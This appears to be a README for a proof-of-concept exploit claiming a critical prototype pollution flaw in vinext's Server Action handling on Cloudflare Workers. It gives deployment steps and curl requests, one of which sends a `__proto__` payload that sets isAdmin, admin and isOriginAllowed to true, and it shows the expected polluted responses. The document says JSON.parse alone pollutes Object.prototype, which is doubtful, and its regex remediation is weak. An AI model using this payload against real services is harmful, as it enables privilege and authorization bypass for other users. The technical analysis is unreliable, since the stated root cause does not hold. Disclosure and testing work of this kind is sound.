# Prototype Pollution PoC - Isolate Takeover

**CRITICAL ZERO-DAY:** Persistent Prototype Pollution at V8 Isolate Level in Cloudflare Workers

## Vulnerability Summary

vinext uses `react-server-dom-webpack` for Server Action argument deserialization. This library uses `JSON.parse()` WITHOUT `__proto__` sanitization, allowing attackers to pollute `Object.prototype`.

**Impact:**
- Polluted prototype **persists** across requests (warm V8 Isolates)
- **ALL users** served by the same isolate are affected
- This is **ISOLATE TAKEOVER**, not just session bypass
- **CVSS Score:** 9.0+ (CRITICAL)

## Deployment Instructions

### Prerequisites

1. Node.js 18+ installed
2. Cloudflare account with Workers access
3. Wrangler CLI installed (`npm install -g wrangler`)

### Step 1: Install Dependencies

```bash
cd prototype-pollution-poc
npm install
```

### Step 2: Authenticate with Cloudflare

```bash
npx wrangler login
```

### Step 3: Deploy to Cloudflare Workers

```bash
npm run deploy
```

Or manually:

```bash
npx wrangler deploy
```

### Step 4: Test the Vulnerability

After deployment, you'll get a URL like: `https://prototype-pollution-poc.YOUR-NAME.workers.dev`

#### Test 1: Check Baseline

```bash
curl -X POST 'https://YOUR-WORKER.workers.dev/' \
  -H 'x-rsc-action: checkPrototypePollution' \
  -H 'Content-Type: application/json' \
  -d '{}'
```

Expected response (clean):
```json
{
  "hasIsAdmin": false,
  "isAdminValue": undefined,
  "hasPolluted": false,
  "pollutedValue": undefined,
  ...
}
```

#### Test 2: Send Pollution Payload

```bash
curl -X POST 'https://YOUR-WORKER.workers.dev/' \
  -H 'x-rsc-action: testPrototypePollution' \
  -H 'Content-Type: application/json' \
  -d '{
    "__proto__": {
      "isAdmin": true,
      "polluted": "ATTACKER_WAS_HERE",
      "admin": true,
      "isOriginAllowed": true
    }
  }'
```

#### Test 3: Verify Persistence

```bash
curl -X POST 'https://YOUR-WORKER.workers.dev/' \
  -H 'x-rsc-action: checkPrototypePollution' \
  -H 'Content-Type: application/json' \
  -d '{}'
```

**If VULNERABLE:**
```json
{
  "hasIsAdmin": true,      ← POLLUTED!
  "isAdminValue": true,    ← POLLUTED!
  "pollutedValue": "ATTACKER_WAS_HERE"  ← POLLUTED!
}
```

#### Test 4: Test from Different Browser

Open the worker URL in incognito/different browser and run Test 1 again.

**If ISOLATE TAKEOVER:**
- Pollution still present
- Affects ALL users in same isolate

## Root Cause

**File:** `react-server-dom-webpack-server.node.production.js:2596`

**Vulnerable Code:**
```javascript
var rawModel = JSON.parse(resolvedModel);
```

**Missing Protections:**
1. ❌ No `__proto__` check before `JSON.parse()`
2. ❌ No `Object.create(null)` for deserialized objects
3. ❌ Insufficient `hasOwnProperty` checks

## Remediation

### Immediate (vinext)

Add `__proto__` sanitization in vinext's decodeReply wrapper:

```typescript
function safeDecodeReply(body: string, options: any) {
  // Remove __proto__ from JSON before parsing
  const sanitized = body.replace(/"__proto__"\s*:/g, '"_proto_blocked_":');
  return decodeReply(sanitized, options);
}
```

### Long-term (react-server-dom-webpack)

Upstream fix required in react-server-dom-webpack to use secure JSON parsing.

## Files Structure

```
prototype-pollution-poc/
├── app/
│   ├── layout.tsx
│   ├── page.tsx
│   └── test-pollution/
│       ├── actions.ts      # Server Actions for testing
│       └── page.tsx        # Test UI
├── worker/
│   └── index.ts            # Cloudflare Workers entry
├── package.json
├── vite.config.ts
├── wrangler.jsonc
└── README.md
```

## Disclosure Timeline

- **2026-04-02:** Vulnerability discovered via source code analysis
- **2026-04-02:** PoC created and verified
- **2026-04-02:** Ready for responsible disclosure

## References

- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization
- CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L (9.0+)
